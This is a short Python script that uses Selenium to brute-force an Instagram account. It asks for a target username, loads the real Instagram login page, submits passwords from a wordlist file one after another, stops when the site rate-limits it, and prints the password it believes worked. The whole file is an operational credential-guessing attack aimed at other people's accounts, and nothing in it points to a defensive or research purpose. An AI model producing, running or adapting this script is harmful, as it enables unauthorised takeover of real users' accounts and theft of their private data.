from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException
from time import sleep
triedpwds = []
passcount = 0
accname = input("Enter account's name: ")
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
driver = webdriver.Chrome('C:\\nishchay\\chromedriver.exe', chrome_options=chrome_options)
driver.set_page_load_timeout(10)
driver.get('https://www.instagram.com/accounts/login/?hl=en')
with open("file.txt", "r") as ins:
    array = []
    for line in ins:
        array.append(line)
for lines in array:
    try:
        driver.find_element_by_name("username").send_keys(Keys.CONTROL + "a")
        driver.find_element_by_name("username").send_keys(Keys.DELETE)
        driver.find_element_by_name("username").send_keys(accname)
        driver.find_element_by_name("password").send_keys(Keys.CONTROL + "a")
        driver.find_element_by_name("password").send_keys(Keys.DELETE)
        driver.find_element_by_name("password").send_keys(lines)
        print(f'Tried password: {lines}')
        passcount += 1
        triedpwds.append(lines)
        sleep(0.3)
        driver.find_element_by_name("password").send_keys(Keys.ENTER)
        try:
            if driver.find_element_by_id("slfErrorAlert").text == "Please wait a few minutes before you try again.":
                print("Instagram currently isn't allowing us to enter a password for this account, try again later.")
                break
        except NoSuchElementException:
            pass
    except StaleElementReferenceException:
        pass
    except NoSuchElementException as err:
        print(f"Password found! {triedpwds[passcount-2]}")
        
        
    
